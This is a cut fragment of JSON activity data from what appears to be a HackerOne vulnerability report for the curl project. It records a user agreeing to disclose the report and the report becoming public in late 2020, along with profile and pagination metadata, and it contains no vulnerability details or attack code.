disclose\u003c/p\u003e\n","automated_response":false,"created_at":"2020-11-05T08:33:29.566Z","updated_at":"2020-11-05T08:33:29.566Z","first_to_agree":true,"actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10012140,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-12-05T08:33:30.928Z","updated_at":"2020-12-05T08:33:30.928Z","actor":{"url":"/curl","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"curl"}},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}